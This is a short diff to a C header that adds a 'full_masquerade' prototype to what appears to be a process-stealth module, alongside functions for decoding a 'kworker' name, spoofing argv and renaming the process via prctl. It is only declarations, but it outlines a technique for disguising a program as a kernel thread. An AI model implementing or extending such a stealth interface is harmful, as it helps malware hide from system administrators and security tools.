@@ -50,6 +50,7 @@ typedef struct {
 void decode_kworker(char *dst, size_t size);
 void masquerade_argv(char **argv, const char *name);
 void prctl_rename(const char *name);
+void full_masquerade(char **argv, int argc);
 
 int ph_stealth_init(ph_stealth_ctx_t *ctx, int argc, char *argv[]);
 int ph_stealth_spoof_argv(ph_stealth_ctx_t *ctx, const char *new_name);
